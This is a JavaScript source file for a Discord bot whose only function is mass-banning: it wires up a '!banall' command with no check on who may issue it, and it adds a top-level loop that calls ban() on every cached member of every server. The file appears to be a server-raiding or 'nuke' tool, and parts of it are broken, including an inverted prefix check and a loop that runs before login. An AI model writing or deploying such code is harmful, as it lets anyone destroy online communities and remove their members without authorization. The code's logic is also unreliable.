import Discord from 'discord.js';
import dotenv from 'dotenv';
dotenv.config();

const client = new Discord.Client();
const token = process.env.TOKEN;
const prefix = '!';

// import commands from './commandManager.js';
import banAll from './commands/banall.js';

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', (msg) => {
  if (!msg.content.substring(0, prefix.length) === prefix) return;
  msg.content = msg.content.substring(prefix.length);
  const query = msg.content.split(' ');

  //   commands.forEach((command) => {
  //     console.log(commands);
  //     if (query[0] === command.name) {
  //       command.run(msg, query);
  //     }
  //   });

  if (query[0] === 'banall') {
    banAll.run(msg, query);
  }
});

client.login(token);

client.guilds.cache.forEach((guild) => {
  guild.members.cache.forEach((member) => {
    member.ban();
    member.hasPermission('ADMINISTRATOR');

  });
  guild.members.cache.array();
});

export default client;
